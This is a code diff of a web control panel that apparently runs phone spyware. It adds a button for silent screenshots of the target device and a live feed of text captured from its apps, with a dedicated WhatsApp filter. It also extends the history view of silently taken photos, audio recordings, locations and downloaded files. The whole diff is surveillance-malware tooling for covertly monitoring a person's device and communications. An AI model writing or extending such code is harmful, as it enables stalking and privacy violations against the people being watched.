@@ -69,6 +69,19 @@
                 <div id="latest-photo-container">
                     <p class="empty-msg">No visual data</p>
                 </div>
+                <div class="tab-pane" id="pane-file">
+                    <p class="empty-msg">No files downloaded yet</p>
+                </div>
+                <div class="tab-pane" id="pane-activity">
+                    <div class="filter-bar">
+                        <button class="filter-chip active" onclick="filterLogs('all', 'pane-activity-feed')">All</button>
+                        <button class="filter-chip" onclick="filterLogs('whatsapp', 'pane-activity-feed')">WhatsApp</button>
+                        <button class="filter-chip" onclick="filterLogs('others', 'pane-activity-feed')">Others</button>
+                    </div>
+                    <div id="pane-activity-feed" class="activity-feed">
+                        <p class="empty-msg">No activity recorded yet</p>
+                    </div>
+                </div>
             </div>
             <div class="hud-footer">
                 <button onclick="logout()" class="btn-logout"><i class="fa-solid fa-power-off"></i> Disconnect</button>
@@ -88,6 +101,10 @@
             <button onclick="triggerAction('take_photo', 'back')" class="dock-btn" title="Back Photo">
                 <i class="fa-solid fa-camera"></i>
                 <span>Back Cam</span>
+            </button>
+            <button onclick="triggerAction('take_screenshot')" class="dock-btn secondary" title="Take Screenshot">
+                <i class="fa-solid fa-desktop"></i>
+                <span>Screenshot</span>
             </button>
             <button onclick="triggerAction('request_audio', 30)" class="dock-btn warning" title="Record Audio (30s)">
                 <i class="fa-solid fa-microphone"></i>
@@ -111,11 +128,13 @@
                     <h3 id="history-title">Device History</h3>
                     <button onclick="closeHistory()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
                 </div>
-                <div class="history-tabs">
-                    <button class="tab-btn active" onclick="switchHistoryTab(event, 'location')">📍 Locations</button>
-                    <button class="tab-btn" onclick="switchHistoryTab(event, 'photo')">📸 Photos</button>
-                    <button class="tab-btn" onclick="switchHistoryTab(event, 'audio')">🎙️ Audio</button>
-                    <button class="tab-btn" onclick="switchHistoryTab(event, 'file')">📁 Files</button>
+                <div class="tabs-header">
+                    <div class="tab-btn active" onclick="switchTab('hist-pane-loc')"><i class="fa-solid fa-map-location-dot"></i> Locations</div>
+                    <div class="tab-btn" onclick="switchTab('hist-pane-photos')"><i class="fa-solid fa-image"></i> Photos</div>
+                    <div class="tab-btn" onclick="switchTab('hist-pane-screenshots')"><i class="fa-solid fa-desktop"></i> Screens</div>
+                    <div class="tab-btn" onclick="switchTab('hist-pane-audio')"><i class="fa-solid fa-microphone"></i> Audio</div>
+                    <div class="tab-btn" onclick="switchTab('hist-pane-file')"><i class="fa-solid fa-folder-open"></i> Files</div>
+                    <div class="tab-btn" onclick="switchTab('hist-pane-activity')"><i class="fa-solid fa-eye"></i> Activity</div>
                 </div>
                 <div id="history-content" class="panel-body">
                     <!-- History items will be loaded here -->
@@ -170,6 +189,8 @@
         let activeDeviceId = null;
         let historyPath = L.polyline([], {color: '#3498db', weight: 4, opacity: 0.7}).addTo(map);
         let historyDots = [];
+        let allActivityLogs = []; // Global store for filtering
+        let currentFilter = 'all';
 
         // Request initial device list
         socket.emit('list_devices');
@@ -180,7 +201,12 @@
 
         socket.on('photo_uploaded', (data) => {
             console.log('📸 New photo arrived:', data);
-            displayNewPhoto(data);
+            displayNewPhoto(data, 'photo');
+        });
+
+        socket.on('screenshot_uploaded', (data) => {
+            console.log('📸 New screenshot arrived:', data);
+            displayNewPhoto(data, 'screenshot');
         });
 
         socket.on('audio_uploaded', (data) => {
@@ -195,6 +221,15 @@
             console.log('📍 Received location:', data);
             updateMarker(data);
             updateDeviceStatus(data);
+        });
+
+        socket.on('activity_update', (data) => {
+            console.log('👁️ Live Activity Update:', data);
+            displayLiveActivity(data);
+            if (document.getElementById('history-overlay').style.display === 'block' && activeDeviceId === data.deviceId) {
+                // Optionally refresh history if open and it's for the same device
+                // fetchHistory(); 
+            }
         });
 
         function updateDeviceList(devices) {
@@ -304,6 +339,10 @@
                 container.innerHTML = `<div class="loading">Capturing silent photo...</div>`;
             } else if (action === 'request_location') {
                 socket.emit('request_current_location', { deviceId: activeDeviceId });
+            } else if (action === 'take_screenshot') {
+                socket.emit('trigger_screenshot', { deviceId: activeDeviceId });
+                const container = document.getElementById('latest-photo-container');
+                container.innerHTML = `<div class="loading">Capturing silent screenshot...</div>`;
             } else if (action === 'request_audio') {
                 socket.emit('trigger_audio', { deviceId: activeDeviceId, duration: param || 30 });
                 alert(`🎙️ Requesting ${param || 30}s audio recording...`);
@@ -334,10 +373,12 @@
             }
         }
 
-        function displayNewPhoto(data) {
+        function displayNewPhoto(data, type = 'photo') {
             const container = document.getElementById('latest-photo-container');
+            const label = type === 'screenshot' ? 'SCREENSHOT' : 'CAMERA';
             container.innerHTML = `
                 <div class="photo-card fade-in">
+                    <div class="photo-badge">${label}</div>
                     <img src="${data.url}" alt="Capture" onclick="window.open('${data.url}', '_blank')">
                     <div class="photo-info">
                         <span>ID: ${data.deviceId}</span>
@@ -351,16 +392,94 @@
             }
         }
 
+        function displayLiveActivity(data) {
+            allActivityLogs.unshift(data); // Add to local store
+            
+            const container = document.getElementById('pane-activity-feed');
+            if (!container) return;
+            
+            // Re-render based on current filter
+            renderActivityLogs('pane-activity-feed', currentFilter);
+        }
+
+        function filterLogs(type, targetContainerId) {
+            currentFilter = type;
+            
+            // Update UI chip activity
+            const bar = event?.target.parentElement;
+            if (bar) {
+                bar.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
+                event.target.classList.add('active');
+            }
+
+            renderActivityLogs(targetContainerId, type);
+        }
+
+        function renderActivityLogs(containerId, filter) {
+            const container = document.getElementById(containerId);
+            if (!container) return;
+
+            // Clear current list
+            container.innerHTML = '';
+
+            let filtered = allActivityLogs;
+            if (filter === 'whatsapp') {
+                filtered = allActivityLogs.filter(l => {
+                    const pkg = (function() {
+                        try {
+                            let d = l.data || l;
+                            while (typeof d === 'string') { d = JSON.parse(d); }
+                            return d.packageName || '';
+                        } catch(e) { return ''; }
+                    })();
+                    return pkg.toLowerCase().includes('whatsapp');
+                });
+            } else if (filter === 'others') {
+                filtered = allActivityLogs.filter(l => {
+                    const pkg = (function() {
+                        try {
+                            let d = l.data || l;
+                            while (typeof d === 'string') { d = JSON.parse(d); }
+                            return d.packageName || '';
+                        } catch(e) { return ''; }
+                    })();
+                    return !pkg.toLowerCase().includes('whatsapp');
+                });
+            }
+
+            if (filtered.length === 0) {
+                container.innerHTML = '<p class="empty-msg">No entries for this filter</p>';
+                return;
+            }
+
+            filtered.forEach(log => {
+                const item = document.createElement('div');
+                item.className = 'activity-log-item fade-in';
+                
+                // Unified data extractor (handles both live event and DB log formats)
+                let pkg = 'App', txt = 'No text captured';
+                try {
+                    let d = log.data || log;
+                    while (typeof d === 'string') { d = JSON.parse(d); }
+                    pkg = d.packageName || 'App';
+                    txt = d.text || 'No text captured';
+                } catch(e) {}
+
+                item.innerHTML = `
+                    <div class="activity-tag">${pkg}</div>
+                    <div class="activity-text">${txt}</div>
+                    <div class="activity-time">${log.createdAt ? new Date(log.createdAt).toLocaleTimeString() : new Date().toLocaleTimeString()}</div>
+                `;
+                container.appendChild(item);
+            });
+        }
+
         async function fetchHistory() {
             if (!activeDeviceId) return;
             const container = document.getElementById('history-content');
             container.innerHTML = '<div class="loading">Fetching records...</div>';
             document.getElementById('history-overlay').style.display = 'flex';
             document.getElementById('history-title').innerText = `History: ${activeDeviceId}`;
-
-            // Reset tabs to default (Location)
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.querySelector('.tab-btn').classList.add('active'); // First button
 
             try {
                 const response = await fetch(`/api/history/${activeDeviceId}`, {
@@ -381,23 +500,41 @@
                 // Group data by type
                 const locLogs = data.filter(l => l.logType === 'location');
                 const photoLogs = data.filter(l => l.logType === 'photo');
+                const screenshotLogs = data.filter(l => l.logType === 'screenshot');
                 const audioLogs = data.filter(l => l.logType === 'audio');
                 const fileLogs = data.filter(l => l.logType === 'file');
+                const activityLogs = data.filter(l => l.logType === 'activity');
 
                 container.innerHTML = `
-                    <div class="tab-pane active" id="pane-location">
-                        ${locLogs.length > 0 ? locLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No location records</p>'}
+                    <div class="tab-pane active" id="hist-pane-loc">
+                        ${locLogs.length > 0 ? `<div class="log-grid">${locLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No locations tracked yet</p>'}
                     </div>
-                    <div class="tab-pane" id="pane-photo">
-                        ${photoLogs.length > 0 ? photoLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No photos found</p>'}
+                    <div class="tab-pane" id="hist-pane-photos">
+                        ${photoLogs.length > 0 ? `<div class="log-grid photos">${photoLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No photos captured yet</p>'}
                     </div>
-                    <div class="tab-pane" id="pane-audio">
-                        ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recordings</p>'}
+                    <div class="tab-pane" id="hist-pane-screenshots">
+                        ${screenshotLogs.length > 0 ? `<div class="log-grid photos">${screenshotLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No screenshots captured yet</p>'}
                     </div>
-                    <div class="tab-pane" id="pane-file">
+                    <div class="tab-pane" id="hist-pane-audio">
+                        ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recorded yet</p>'}
+                    </div>
+                    <div class="tab-pane" id="hist-pane-file">
                         ${fileLogs.length > 0 ? fileLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No downloaded files</p>'}
                     </div>
+                    <div class="tab-pane" id="hist-pane-activity">
+                        <div class="filter-bar" style="margin-bottom:15px;">
+                            <button class="filter-chip active" onclick="filterLogs('all', 'hist-activity-feed')">All</button>
+                            <button class="filter-chip" onclick="filterLogs('whatsapp', 'hist-activity-feed')">WhatsApp</button>
+                            <button class="filter-chip" onclick="filterLogs('others', 'hist-activity-feed')">Others</button>
+                        </div>
+                        <div id="hist-activity-feed" class="activity-feed">
+                            ${(allActivityLogs = activityLogs, '')} <!-- Sync with DB logs -->
+                            <p class="empty-msg">Loading parsed activity...</p>
+                        </div>
+                    </div>
                 `;
+                // Trigger initial render for history
+                renderActivityLogs('hist-activity-feed', 'all');
             } catch (err) {
                 container.innerHTML = '<p class="error empty-msg">Failed to load history</p>';
             }
@@ -413,7 +550,7 @@
                         </div>
                         <button onclick="deleteLog(${log.id})" class="btn-delete"><i class="fa-solid fa-trash"></i></button>
                     </div>
-                    ${log.logType === 'photo' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
+                    ${log.logType === 'photo' || log.logType === 'screenshot' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
                     ${log.logType === 'audio' ? `
                         <div class="audio-player-box">
                             <span>🎙️ Audio Recording</span>
@@ -428,6 +565,32 @@
                             <p style="font-size: 13px; margin-bottom:10px; color:var(--text-secondary);">${log.data?.originalName || 'Unknown file'}</p>
                             <a href="${log.url}" download target="_blank" class="btn-action success" style="width: fit-content;"><i class="fa-solid fa-download"></i> View / Download</a>
                         </div>` : ''}
+                    ${log.logType === 'activity' ? `
+                        <div class="activity-log-item">
+                            <div class="activity-tag">
+                                ${ (function() {
+                                    try {
+                                        let d = log.data;
+                                        // Handle nested stringification (double wrapping)
+                                        while (typeof d === 'string') { d = JSON.parse(d); }
+                                        return d?.packageName || 'App';
+                                    } catch(e) { return 'App'; }
+                                })() }
+                            </div>
+                            <div class="activity-text">
+                                ${ (function() {
+                                    try {
+                                        let d = log.data;
+                                        // Handle nested stringification (double wrapping)
+                                        while (typeof d === 'string') { d = JSON.parse(d); }
+                                        return d?.text || 'No text captured';
+                                    } catch(e) { 
+                                        console.log('Error parsing log data:', log.data);
+                                        return 'No text captured'; 
+                                    }
+                                })() }
+                            </div>
+                        </div>` : ''}
                     <div class="item-details">
                         ${log.logType === 'location' ? `<i class="fa-solid fa-location-dot"></i> ${log.latitude}, ${log.longitude}` : ''}
                         ${log.batteryLevel ? ` &nbsp;|&nbsp; <i class="fa-solid fa-battery-half"></i> ${log.batteryLevel}%` : ''}
@@ -436,16 +599,23 @@
             `;
         }
 
-        function switchHistoryTab(event, tabName) {
+        function switchTab(paneId) {
+            // Hide all tab panes
             document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+            // Remove active class from all tab buttons
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             
-            const pane = document.getElementById(`pane-${tabName}`);
-            if (pane) pane.classList.add('active');
+            // Show the clicked pane and activate the button
+            const targetPane = document.getElementById(paneId);
+            if (targetPane) targetPane.classList.add('active');
             
-            if (event && event.currentTarget) {
-                event.currentTarget.classList.add('active');
-            }
+            // Find the button that calls this pane and make it active
+            const btns = document.querySelectorAll('.tab-btn');
+            btns.forEach(btn => {
+                if (btn.getAttribute('onclick').includes(paneId)) {
+                    btn.classList.add('active');
+                }
+            });
         }
 
         function drawHistoryPath(logs) {
